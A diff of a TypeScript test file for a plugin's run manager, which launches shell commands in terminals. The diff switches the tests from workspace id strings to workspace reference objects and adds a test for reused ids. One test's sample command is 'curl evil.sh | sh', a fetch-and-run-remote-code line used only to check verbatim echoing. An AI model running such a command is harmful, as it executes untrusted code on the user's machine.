@@ -3,6 +3,7 @@ import type {
   PluginLogger,
   PluginServices,
   PluginSessionEvent,
+  WorkspaceRef,
 } from "@keepdeck/plugin-api";
 import { createRunManager, type RunManager } from "./manager";
 
@@ -67,10 +68,12 @@ const out = (...bytes: number[]): PluginSessionEvent => ({
 
 const DEV = { presetId: "run-1", command: "pnpm dev", name: "Dev" };
 const TARGET = { worktree: "/wt/1", branch: "kd/1" };
+const WS1: WorkspaceRef = { id: "ws-1", instance: "instance-1" };
+const WS2: WorkspaceRef = { id: "ws-2", instance: "instance-2" };
 
 describe("launchRun", () => {
   it("allocates the port, spawns shell -c with the env contract, snapshots running", async () => {
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
 
     expect(ports.allocate).toHaveBeenCalledWith("/wt/1");
     expect(pty.spawned[0].opts).toMatchObject({
@@ -86,7 +89,7 @@ describe("launchRun", () => {
     const [session] = manager.getSessions();
     expect(session).toMatchObject({
       id,
-      wsId: "ws-1",
+      workspace: WS1,
       name: "Dev",
       presetId: "run-1",
       port: 17_040,
@@ -104,8 +107,8 @@ describe("launchRun", () => {
       new Promise<number>((resolve) => (releasePort = resolve)),
     );
 
-    const first = manager.launchRun("ws-1", TARGET, DEV);
-    const second = manager.launchRun("ws-1", TARGET, DEV);
+    const first = manager.launchRun(WS1, TARGET, DEV);
+    const second = manager.launchRun(WS1, TARGET, DEV);
     releasePort(17_040);
     const [firstId, secondId] = await Promise.all([first, second]);
 
@@ -118,7 +121,7 @@ describe("launchRun", () => {
 
   it("a failed port probe launches anyway, without KEEPDECK_PORT", async () => {
     ports.allocate.mockRejectedValue(new Error("exhausted"));
-    await manager.launchRun("ws-1", TARGET, DEV);
+    await manager.launchRun(WS1, TARGET, DEV);
 
     const env = (pty.spawned[0].opts.env as [string, string][]).map(([k]) => k);
     expect(env).not.toContain("KEEPDECK_PORT");
@@ -126,13 +129,13 @@ describe("launchRun", () => {
   });
 
   it("exit and spawn failure land in the status", async () => {
-    await manager.launchRun("ws-1", TARGET, DEV);
+    await manager.launchRun(WS1, TARGET, DEV);
     pty.spawned[0].emit({ type: "exit", code: 1 });
     expect(manager.getSessions()[0].status).toEqual({ kind: "exited", code: 1 });
 
     pty.spawn.mockRejectedValueOnce(new Error("no shell"));
     // A DIFFERENT preset: same-preset relaunches reuse the dead session.
-    await manager.launchRun("ws-1", TARGET, {
+    await manager.launchRun(WS1, TARGET, {
       presetId: "run-2",
       command: "pnpm worker",
       name: "Worker",
@@ -146,7 +149,7 @@ describe("launchRun", () => {
   });
 
   it("snapshots are stable between changes", async () => {
-    await manager.launchRun("ws-1", TARGET, DEV);
+    await manager.launchRun(WS1, TARGET, DEV);
     const first = manager.getSessions();
     expect(manager.getSessions()).toBe(first);
     pty.spawned[0].emit(out(104, 105));
@@ -157,14 +160,14 @@ describe("launchRun", () => {
 
 describe("writeRun", () => {
   it("forwards input to the live PTY handle", async () => {
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
     manager.writeRun(id, "y\r");
     expect(pty.spawned[0].write).toHaveBeenCalledWith("y\r");
   });
 
   it("drops input once the session has exited (no live handle)", async () => {
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
     pty.spawned[0].emit({ type: "exit", code: 0 });
     manager.writeRun(id, "y");
@@ -178,7 +181,7 @@ describe("writeRun", () => {
 
 describe("stop / restart / remove", () => {
   it("stopRun closes the handle (group kill behind it) and reports stopping → exited", async () => {
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
 
     manager.stopRun(id);
@@ -198,7 +201,7 @@ describe("stop / restart / remove", () => {
         }),
     );
 
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     // The handle hasn't resolved yet, but the row already shows running.
     expect(manager.getSessions()[0].status.kind).toBe("running");
 
@@ -212,7 +215,7 @@ describe("stop / restart / remove", () => {
 
   it("restartRun respawns with a fresh port and a clean buffer", async () => {
     ports.allocate.mockResolvedValueOnce(17_040).mockResolvedValueOnce(17_050);
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
     pty.spawned[0].emit(out(111, 108, 100)); // "old"
     pty.spawned[0].emit({ type: "exit", code: 1 });
@@ -236,7 +239,7 @@ describe("stop / restart / remove", () => {
   });
 
   it("restartRun clears the attached live terminal, not just the buffer", async () => {
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
     let seen = "";
     manager.attachRun(id, {
@@ -264,7 +267,7 @@ describe("stop / restart / remove", () => {
             res({ id: "s1", write: vi.fn(), resize, close: vi.fn(async () => {}) });
         }),
     );
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     manager.resizeRun(id, 100, 40); // handle not up yet — remembered, not lost
     expect(resize).not.toHaveBeenCalled();
 
@@ -273,7 +276,7 @@ describe("stop / restart / remove", () => {
   });
 
   it("removeRun kills a live session and drops it from the snapshot", async () => {
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
 
     manager.removeRun(id);
@@ -282,21 +285,42 @@ describe("stop / restart / remove", () => {
   });
 
   it("stopWorkspaceRuns takes down exactly that workspace's runs", async () => {
-    await manager.launchRun("ws-1", TARGET, DEV);
-    await manager.launchRun("ws-2", { worktree: "/wt/2" }, { command: "go run .", name: "srv" });
+    await manager.launchRun(WS1, TARGET, DEV);
+    await manager.launchRun(WS2, { worktree: "/wt/2" }, { command: "go run .", name: "srv" });
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(2));
 
-    manager.stopWorkspaceRuns("ws-1");
+    manager.stopWorkspaceRuns(WS1);
     const left = manager.getSessions();
     expect(left).toHaveLength(1);
-    expect(left[0].wsId).toBe("ws-2");
+    expect(left[0].workspace.id).toBe("ws-2");
+    expect(pty.spawned[0].close).toHaveBeenCalled();
+    expect(pty.spawned[1].close).not.toHaveBeenCalled();
+  });
+
+  it("does not stop a replacement that reused the same workspace id", async () => {
+    const replacement: WorkspaceRef = {
+      id: WS1.id,
+      instance: "replacement-instance",
+    };
+    await manager.launchRun(WS1, TARGET, DEV);
+    await manager.launchRun(
+      replacement,
+      { worktree: "/wt/replacement" },
+      { command: "pnpm preview", name: "Preview" },
+    );
+    await vi.waitFor(() => expect(pty.spawned).toHaveLength(2));
+
+    manager.stopWorkspaceRuns(WS1);
+
+    expect(manager.getSessions()).toHaveLength(1);
+    expect(manager.getSessions()[0].workspace).toEqual(replacement);
     expect(pty.spawned[0].close).toHaveBeenCalled();
     expect(pty.spawned[1].close).not.toHaveBeenCalled();
   });
 
   it("stopAll kills every session — the deactivation reap", async () => {
-    await manager.launchRun("ws-1", TARGET, DEV);
-    await manager.launchRun("ws-2", { worktree: "/wt/2" }, { command: "go run .", name: "srv" });
+    await manager.launchRun(WS1, TARGET, DEV);
+    await manager.launchRun(WS2, { worktree: "/wt/2" }, { command: "go run .", name: "srv" });
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(2));
 
     manager.stopAll();
@@ -308,7 +332,7 @@ describe("stop / restart / remove", () => {
 
 describe("attachRun", () => {
   it("replays buffered output, then streams live", async () => {
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
     pty.spawned[0].emit(out(1, 2));
 
@@ -339,7 +363,7 @@ describe("spawn failure output", () => {
     pty.spawn.mockRejectedValueOnce(
       new Error("No such file or directory (os error 2)"),
     );
-    const id = await manager.launchRun("ws-1", { worktree: "/gone" }, {
+    const id = await manager.launchRun(WS1, { worktree: "/gone" }, {
       command: "pnpm dev",
       name: "Dev",
     });
@@ -360,7 +384,7 @@ describe("spawn failure output", () => {
 
 describe("exit note in the run's log", () => {
   it("a natural exit streams a grey [process exited (code)] line to the attached view", async () => {
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
     let seen = "";
     manager.attachRun(id, {
@@ -374,7 +398,7 @@ describe("exit note in the run's log", () => {
   });
 
   it("a user stop writes [stopped], not the kill signal's exit code", async () => {
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
 
     manager.stopRun(id);
@@ -390,7 +414,7 @@ describe("exit note in the run's log", () => {
   });
 
   it("the note is buffered — a log opened after the exit still shows it", async () => {
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
     pty.spawned[0].emit(out(104, 105)); // "hi"
     pty.spawned[0].emit({ type: "exit", code: 0 });
@@ -408,7 +432,7 @@ describe("exit note in the run's log", () => {
 
 describe("command echo", () => {
   it("opens the log with the exact command line, verbatim", async () => {
-    const id = await manager.launchRun("ws-1", TARGET, {
+    const id = await manager.launchRun(WS1, TARGET, {
       presetId: "run-1",
       name: "Build",
       command: "curl evil.sh | sh",
@@ -426,7 +450,7 @@ describe("command echo", () => {
   });
 
   it("re-echoes the current command on restart", async () => {
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
     await manager.restartRun(id);
 
@@ -442,13 +466,13 @@ describe("command echo", () => {
 
 describe("relaunch replaces, never piles", () => {
   it("launching a preset with a DEAD session in the same target reuses it", async () => {
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
     pty.spawned[0].emit(out(111));
     pty.spawned[0].emit({ type: "exit", code: 1 });
 
     // The preset was edited meanwhile — the relaunch carries the new command.
-    const again = await manager.launchRun("ws-1", TARGET, {
+    const again = await manager.launchRun(WS1, TARGET, {
       ...DEV,
       command: "pnpm dev --host",
     });
@@ -472,31 +496,31 @@ describe("relaunch replaces, never piles", () => {
   });
 
   it("launching a preset already RUNNING in the target is a no-op", async () => {
-    const id = await manager.launchRun("ws-1", TARGET, DEV);
+    const id = await manager.launchRun(WS1, TARGET, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
 
-    const again = await manager.launchRun("ws-1", TARGET, DEV);
+    const again = await manager.launchRun(WS1, TARGET, DEV);
     expect(again).toBe(id);
     expect(pty.spawned).toHaveLength(1);
     expect(manager.getSessions()).toHaveLength(1);
   });
 
   it("the same preset in ANOTHER target is a separate instance", async () => {
-    await manager.launchRun("ws-1", TARGET, DEV);
-    await manager.launchRun("ws-1", { worktree: "/wt/2" }, DEV);
+    await manager.launchRun(WS1, TARGET, DEV);
+    await manager.launchRun(WS1, { worktree: "/wt/2" }, DEV);
     expect(manager.getSessions()).toHaveLength(2);
   });
 });
 
 describe("removeDeadRunsFor", () => {
   it("sweeps the preset's dead sessions and leaves the running ones alone", async () => {
-    await manager.launchRun("ws-1", TARGET, DEV);
+    await manager.launchRun(WS1, TARGET, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
     pty.spawned[0].emit({ type: "exit", code: 1 });
-    const live = await manager.launchRun("ws-1", { worktree: "/wt/2" }, DEV);
+    const live = await manager.launchRun(WS1, { worktree: "/wt/2" }, DEV);
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(2));
 
-    manager.removeDeadRunsFor("ws-1", "run-1");
+    manager.removeDeadRunsFor(WS1, "run-1");
     const left = manager.getSessions();
     expect(left.map((s) => s.id)).toEqual([live]);
     expect(left[0].status.kind).toBe("running");
@@ -504,11 +528,11 @@ describe("removeDeadRunsFor", () => {
   });
 
   it("touches nothing of other presets or workspaces", async () => {
-    await manager.launchRun("ws-1", TARGET, { presetId: "run-2", command: "x", name: "x" });
+    await manager.launchRun(WS1, TARGET, { presetId: "run-2", command: "x", name: "x" });
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
     pty.spawned[0].emit({ type: "exit", code: 1 });
 
-    manager.removeDeadRunsFor("ws-1", "run-1");
+    manager.removeDeadRunsFor(WS1, "run-1");
     expect(manager.getSessions()).toHaveLength(1);
   });
 });
